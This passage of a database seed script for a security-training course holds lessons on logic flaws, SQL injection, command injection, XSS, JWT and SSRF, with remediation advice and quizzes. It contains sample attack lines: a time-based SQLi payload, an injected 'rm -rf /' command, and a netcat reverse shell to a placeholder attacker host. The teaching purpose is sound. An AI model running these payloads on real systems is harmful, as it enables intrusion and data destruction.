IDOR is the king of logic flaws. It occurs when an application provides direct access to objects based on user-supplied input.
- **The Attack**: A user sees their invoice at \`/api/v1/invoices/999\`. They change the ID to \`1000\` and see someone else's invoice.
- **The Core Flaw**: The server checked if the user was *logged in*, but didn't check if the user *owned* invoice 1000.

#### B. Workflow Bypassing (Step Skipping)
Many complex actions involve multiple steps (e.g., Step 1: Verification -> Step 2: Payment -> Step 3: Success).
- **The Attack**: An attacker skips Step 2 (Payment) and navigates directly to the Step 3 URL or triggers the Step 3 API endpoint.
- **The Core Flaw**: The server assumes that if a user reached Step 3, they must have completed Step 2, rather than maintaining a secure server-side state machine.

#### C. Parameter Pollution and Tampering
Attackers manipulate hidden fields, cookies, or URL parameters to change the application's behavior.
- **The Attack**: An e-commerce site has a hidden field \`<input type="hidden" name="discount" value="10">\`. The attacker changes the value to \`99\`.
- **The Core Flaw**: Trusting the client to provide authoritative data about business rules.

#### D. Race Conditions (TOCTOU)
"Time-of-Check to Time-of-Use" flaws occur when an application performs a check (e.g., "Does this user have enough balance?") and then performs an action, but the state changes in between.
- **The Attack**: A user triggers two "Withdraw $100" requests simultaneously. The server checks the balance for both at the same time, sees $150, and approves both, resulting in a negative balance.

### 3. Case Study: The "Infinite Discount" Bug
In 2019, a major food delivery app had a logic flaw in its referral system.
1.  A user referred a friend.
2.  The user received a $10 coupon.
3.  The user discovered that by canceling the "Invite" request *after* the coupon was issued but *before* the friend accepted, they could keep the coupon and send the invite again.
4.  Attackers automated this to generate thousands of dollars in free credit.

### 4. Strategic Defenses for the Logic Layer

#### Rule 1: Never Trust the Client
This is the golden rule of Product Security. Assume that every piece of data coming from the browser—parameters, headers, cookies, and body—is malicious and has been tampered with.

#### Rule 2: Server-Side State Enforcement
For multi-step processes, maintain the "State" of the user's progress on the server (e.g., in a Redis session or a database flag). Do not allow access to an endpoint unless the server verifies the previous prerequisite step was completed successfully.

#### Rule 3: Use Non-Enumerable IDs (UUIDs)
While not a primary defense, using UUIDs (e.g., \`550e8400-e29b-41d4-a716-446655440000\`) instead of sequential integers (\`1, 2, 3\`) makes IDOR attacks significantly harder to execute, as an attacker cannot simply "guess" the next ID.

#### Rule 4: Enforce Business Invariants
Define "Invariants"—rules that can never be broken.
- "The total price can never be less than the cost of items."
- "A user can only have one active session of this type."
- "The discount percentage can never exceed 50%."
Implement these checks at the *final point of execution* (the "Sink").

### 5. Technical Implementation: Securing an IDOR
**Insecure Pattern:**
\`\`\`javascript
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.getInvoice(req.params.id); // Only checks if ID exists
  res.json(invoice);
});
\`\`\`

**Secure Pattern:**
\`\`\`javascript
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.getInvoice(req.params.id);
  
  // Check ownership explicitly
  if (invoice.userId !== req.user.id) {
    return res.status(403).json({ error: "Access Denied" });
  }
  
  res.json(invoice);
});
\`\`\`

### 6. Summary: Thinking Like a Contrarian
To find logic flaws, you must stop looking at what the code *does* and start looking at what the code *allows*. 
- What happens if I provide a negative number?
- What happens if I trigger this twice at the exact same millisecond?
- What happens if I skip the "Address Verification" step?

In the next lesson, we will explore the **Secure Code Review** process, where we learn to spot these logic flaws and technical bugs in the source code itself.
`
                }
              ]
            }
          }
        ]
      }
    }
  });

  const lessons = await prisma.lesson.findMany({ include: { section: { include: { course: true } } } });

  for (const lesson of lessons) {
    if (lesson.title === 'The Evolution of Software Security: From Firewalls to Architecture') {
      await prisma.quiz.create({
        data: {
          lessonId: lesson.id,
          questions: {
            create: [
              {
                text: "What was the primary mental model for security in the 'Perimeter Era'?",
                answers: {
                  create: [
                    { text: "Zero Trust Architecture", isCorrect: false },
                    { text: "Castle and Moat Strategy", isCorrect: true },
                    { text: "Defense in Depth", isCorrect: false },
                    { text: "Shift Left Methodology", isCorrect: false }
                  ]
                }
              },
              {
                text: "Which seismic shift contributed most to the dissolution of the network perimeter?",
                answers: {
                  create: [
                    { text: "The rise of desktop firewalls", isCorrect: false },
                    { text: "The transition to Cloud and SaaS", isCorrect: true },
                    { text: "The use of physical server locks", isCorrect: false },
                    { text: "The improvement of VPN encryption", isCorrect: false }
                  ]
                }
              },
              {
                text: "What is the focus of Product Security (ProdSec)?",
                answers: {
                  create: [
                    { text: "Internal employee laptops", isCorrect: false },
                    { text: "Customer-facing applications and APIs", isCorrect: true },
                    { text: "Office physical security", isCorrect: false },
                    { text: "Phishing simulations", isCorrect: false }
                  ]
                }
              },
              {
                text: "How much more does it cost to fix a bug in production vs. design?",
                answers: {
                  create: [
                    { text: "2 to 5 times", isCorrect: false },
                    { text: "10 to 20 times", isCorrect: false },
                    { text: "30 to 100 times", isCorrect: true },
                    { text: "500 to 1000 times", isCorrect: false }
                  ]
                }
              },
              {
                text: "What lesson did the SolarWinds breach teach the industry?",
                answers: {
                  create: [
                    { text: "Firewalls are 100% effective", isCorrect: false },
                    { text: "VPNs are no longer needed", isCorrect: false },
                    { text: "The software supply chain is a critical attack surface", isCorrect: true },
                    { text: "Passwords should be at least 12 characters", isCorrect: false }
                  ]
                }
              },
              {
                text: "Which principle states that access should be denied unless explicitly allowed?",
                answers: {
                  create: [
                    { text: "Defense in Depth", isCorrect: false },
                    { text: "Fail-Safe Defaults / Least Privilege", isCorrect: true },
                    { text: "Separation of Concerns", isCorrect: false },
                    { text: "KISS (Keep It Simple)", isCorrect: false }
                  ]
                }
              }
            ]
          }
        }
      });
    } else if (lesson.title === 'Threat Modeling: The Architectural Blueprint') {
        await prisma.quiz.create({
            data: {
                lessonId: lesson.id,
                questions: {
                    create: [
                        {
                            text: "Which of the 'Shostack Four' questions asks about threat identification?",
                            answers: {
                                create: [
                                    { text: "What are we building?", isCorrect: false },
                                    { text: "What can go wrong?", isCorrect: true },
                                    { text: "What are we going to do about it?", isCorrect: false },
                                    { text: "Did we do a good job?", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "In STRIDE, what does the 'R' stand for?",
                            answers: {
                                create: [
                                    { text: "Risk", isCorrect: false },
                                    { text: "Resilience", isCorrect: false },
                                    { text: "Repudiation", isCorrect: true },
                                    { text: "Redundancy", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "Which security property is threatened by Information Disclosure?",
                            answers: {
                                create: [
                                    { text: "Integrity", isCorrect: false },
                                    { text: "Availability", isCorrect: false },
                                    { text: "Confidentiality", isCorrect: true },
                                    { text: "Authenticity", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "What is the most critical element of a Data Flow Diagram (DFD) for threat modeling?",
                            answers: {
                                create: [
                                    { text: "Process nodes", isCorrect: false },
                                    { text: "Trust Boundaries", isCorrect: true },
                                    { text: "Data store icons", isCorrect: false },
                                    { text: "Color coding", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "In the DREAD model, what does 'Reproducibility' measure?",
                            answers: {
                                create: [
                                    { text: "How much damage the attack causes", isCorrect: false },
                                    { text: "How many users are affected", isCorrect: false },
                                    { text: "How easy it is to repeat the attack", isCorrect: true },
                                    { text: "How easy it is to find the bug", isCorrect: false }
                                ]
                            }
                        }
                    ]
                }
            }
        });
    } else if (lesson.title === 'Securing Business Logic: Beyond the Syntax') {
        await prisma.quiz.create({
            data: {
                lessonId: lesson.id,
                questions: {
                    create: [
                        {
                            text: "What is an IDOR vulnerability?",
                            answers: {
                                create: [
                                    { text: "Accessing someone else's data by guessing an ID", isCorrect: true },
                                    { text: "A type of SQL injection", isCorrect: false },
                                    { text: "A cross-site scripting attack", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "What is the golden rule of securing business logic?",
                            answers: {
                                create: [
                                    { text: "Trust the user's browser", isCorrect: false },
                                    { text: "Never trust the client", isCorrect: true },
                                    { text: "Use long passwords", isCorrect: false },
                                    { text: "Encrypt everything", isCorrect: false }
                                ]
                            }
                        },
                        {
                            text: "What is a 'Race Condition' (TOCTOU)?",
                            answers: {
                                create: [
                                    { text: "A slow database query", isCorrect: false },
                                    { text: "A flaw where state changes between check and use", isCorrect: true },
                                    { text: "A network timeout", isCorrect: false }
                                ]
                            }
                        }
                    ]
                }
            }
        });
    }
  }

  const course2 = await prisma.course.create({
    data: {
      title: 'Advanced Web Vulnerabilities',
      description: 'Master the technical identification and remediation of complex web flaws including SQLi, XSS, Broken Auth, and Deserialization.',
      sections: {
        create: [
          {
            title: '1. Advanced Injection & Command Execution',
            order: 1,
            lessons: {
              create: [
                {
                  title: 'Advanced SQL Injection: Inference & Bypassing',
                  order: 1,
                  labId: sqliLab.id,
                  content: `
# Advanced SQL Injection: Inference & Bypassing

### 1. The Core Vulnerability: Context Confusion
SQL Injection (SQLi) is fundamentally a "Context Confusion" vulnerability. It occurs when an application fails to properly distinguish between **Executable Code** (the SQL query) and **Literal Data** (the user input). By blending these two contexts, the application allows the user to redefine the logic of the query.

### 2. Taxonomy of SQL Injection

#### A. In-Band (Classic) SQLi
The attacker uses the same communication channel to launch the attack and gather results.
- **Union-Based**: The attacker uses the \`UNION\` operator to combine results.
- **Error-Based**: The attacker intentionally triggers a database error that contains data.

#### B. Inferential (Blind) SQLi
The application doesn't return data directly. The attacker must "infer" results.
- **Boolean-Based**: Asks the database True/False questions (e.g., "Does the password start with 'A'?").
- **Time-Based**: Tells the database to wait if a condition is true (e.g., "If true, sleep for 10 seconds").

### 3. Deep Dive: Time-Based Blind SQLi Analysis
Imagine a login endpoint where you suspect a vulnerability in the \`username\` field. Standard payloads like \`' OR 1=1 --\` are blocked by a WAF.

**The Attack Vector:**
You send a payload that asks the database to pause if a condition is met.
\`\`\`sql
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a) AND '1'='1
\`\`\`

**The Result:**
- If the server responds in 100ms, the condition was false.
- If the server responds in 10,100ms, you have confirmed a time-based SQLi. 

### 4. Professional Standard for Remediation
There is only one ironclad defense against SQL Injection: **Parameterized Queries (Prepared Statements).**

**The Insecure Way (Concatenation):**
\`\`\`javascript
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
db.execute(query);
\`\`\`

**The Secure Way (Parameterization):**
\`\`\`javascript
const query = "SELECT * FROM users WHERE email = ?";
db.execute(query, [req.body.email]);
\`\`\`
The database receives the query structure first, then the data separately. The data is NEVER executed.
`
                },
                {
                  title: 'Command Injection & RCE: The Ultimate Compromise',
                  order: 2,
                  content: `
# Command Injection & RCE: The Ultimate Compromise

### 1. The Anatomy of Command Injection
Command Injection occurs when an application passes user-supplied data directly to a system shell. This is the most critical vulnerability a product can have, as it leads to full system takeover.

### 2. The Danger of "Convenience" Functions
Developers often use shell commands for simple tasks like pinging a host or converting an image.
\`\`\`javascript
// DANGEROUS
exec("ping -c 4 " + req.body.ip);
\`\`\`
If the user provides \`8.8.8.8; rm -rf /\`, the server will execute both commands.

### 3. Achieving Persistence: The Reverse Shell
A single command injection is often just the beginning. Attackers want an interactive shell.
**The Netcat Pivot:**
\`nc -e /bin/sh attacker_ip 4444\`
This connects the server's shell back to the attacker's machine.

### 4. Architectural Remediation
1. **Use Built-in APIs**: Use native network libraries instead of \`exec("ping")\`.
2. **Argument Escaping**: If you MUST use a shell, use functions that take an array of arguments (e.g., \`spawn('ping', ['-c', '4', ip])\`).
`
                }
              ]
            }
          },
          {
            title: '2. Client-Side & Authentication Security',
            order: 2,
            lessons: {
              create: [
                {
                  title: 'Cross-Site Scripting (XSS): The Art of Client-Side Compromise',
                   order: 1,
                  content: `
# Cross-Site Scripting (XSS): The Art of Client-Side Compromise

### 1. Introduction: The DOM as an Execution Environment
XSS occurs when an application includes untrusted data in a web page without proper escaping, allowing an attacker to execute malicious scripts in the victim's browser.

### 2. Taxonomy of XSS Attacks
- **Reflected XSS**: Script is "reflected" off the server via a URL parameter.
- **Stored XSS**: Script is permanently stored on the server (e.g., in a database).
- **DOM-Based XSS**: Vulnerability exists entirely in client-side JavaScript.

### 3. Escalation: Full Account Takeover
XSS allows for session hijacking, keylogging, and virtual defacement.

### 4. Architectural Remediation
1. **Never Use \`innerHTML\`**: Use \`textContent\` instead.
2. **Output Encoding**: Escape data based on the context (HTML, Attribute, JavaScript).
3. **Content Security Policy (CSP)**: Restrict which scripts can run on your page.
`
                },
                {
                  title: 'Broken Authentication: Session Management & JWT Security',
                  order: 2,
                  labId: brokenAuthLab.id,
                  content: `
# Broken Authentication: Session Management & JWT Security

### 1. The Criticality of the Identity Layer
Authentication is the process of verifying who a user is. If this layer is broken, every other security control in the application is rendered useless.

### 2. Session Management Flaws
- **Session Hijacking**: Stealing a session cookie via XSS or network sniffing.
- **Session Fixation**: Forcing a user to use a known session ID.
- **Weak Session IDs**: Using predictable or enumerable IDs (e.g., \`123\`).

### 3. JWT Security: The Modern Attack Surface
JSON Web Tokens (JWT) are common in modern APIs but are often misconfigured.
- **The "None" Algorithm**: Attackers change the header to \`{"alg": "none"}\` to bypass signature verification.
- **Weak Secret Keys**: Brute-forcing the HMAC secret if it is too short.
- **Lack of Expiration**: Tokens that never expire allow for indefinite access if stolen.

### 4. Architectural Remediation
1. **Secure Cookie Attributes**: Use \`HttpOnly\`, \`Secure\`, and \`SameSite=Strict\`.
2. **MFA (Multi-Factor Authentication)**: The most effective defense against credential theft.
3. **Token Validation**: Always verify signatures and expiration on the server side.
`
                }
              ]
            }
          },
          {
            title: '3. Advanced Data & Logic Exploitation',
            order: 3,
            lessons: {
              create: [
                {
                  title: 'Insecure Deserialization: Achieving RCE via Objects',
                  order: 1,
                  labId: webGoatLab.id,
                  content: `
# Insecure Deserialization: Achieving RCE via Objects

### 1. Introduction: Objects as Attack Vectors
Deserialization is the process of turning a stream of data (from a file or network) back into a live object in memory. If an attacker can control the contents of that stream, they can often force the application to execute arbitrary code.

### 2. The Gadget Chain
Attackers identify "gadgets"—classes already present in the application's classpath—that can be chained together during deserialization to perform dangerous actions, like writing a file or executing a system command.

### 3. Scenario: The Java Serialization Attack
In 2015, a massive vulnerability in the Apache Commons Collections library allowed for RCE on millions of servers by simply sending a malicious serialized object to a vulnerable endpoint.

### 4. Architectural Remediation
1. **Never Deserialize Untrusted Data**: Use safer formats like JSON or XML with DTDs disabled.
2. **Look-ahead Deserialization**: Use libraries that validate the class type before actually recreating the object.
3. **Integrity Checks**: Sign serialized data to ensure it hasn't been tampered with.
`
                },
                {
                  title: 'Server-Side Request Forgery (SSRF): The Internal Network Pivot',
                  order: 2,
                  content: `
# Server-Side Request Forgery (SSRF): The Internal Network Pivot

### 1. Introduction: The Trusted Proxy
SSRF occurs when a web application can be forced to make an HTTP request to an arbitrary URL, allowing attackers to access internal systems or cloud metadata services.

### 2. The Cloud Metadata Attack
Applications on AWS/GCP can often access a local metadata service at \`169.254.169.254\` to retrieve IAM credentials.

### 3. Architectural Remediation
1. **Disable Metadata Access**: Use IMDSv2.
2. **Network Isolation**: Run the application in a restricted VPC.
3. **Allowlist Outbound Requests**: Only allow requests to known, trusted endpoints.
`
                }
              ]
            }
          }
        ]
      }
    }
  });

  console.log('Seed complete.');
  console.log('  Admin: user@aeroacademy.org / ChangeMe123!');
  console.log('  Students: amadou@aeroacademy.org etc. / ChangeMe123!');
  console.log('');
  console.log('Seeding Linux curriculum...');
  const linuxLabs = await seedLinuxLabs(ENCRYPTION_KEY);
  await seedLinuxCourses(prisma, linuxLabs);
  await seedLinuxCoursesPart2(prisma, linuxLabs);
  await seedLinuxCoursesPart3(prisma, linuxLabs);
  console.log('Linux curriculum seed complete!');

  console.log('Seeding master classes...');
  await seedMasterClasses();
  console.log('Master classes seed complete!');

  console.log('Seeding trainers...');
  await seedTrainers();
  console.log('Trainers seed complete!');

  console.log('Seeding skill domains and skills...');
  await seedSkillDomains(prisma);
  console.log('Skill seeding complete!');

  console.log('Seeding lab-skill mappings...');
  await seedLabSkills(prisma);
  console.log('Lab-skill mapping complete!');

  console.log('Seeding feature unlock defaults...');
  await seedFeatureUnlocks(prisma);
  console.log('Feature unlock seeding complete!');

  console.log('Seeding certifications...');
  await seedCertifications(prisma);
  console.log('Certification seeding complete!');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
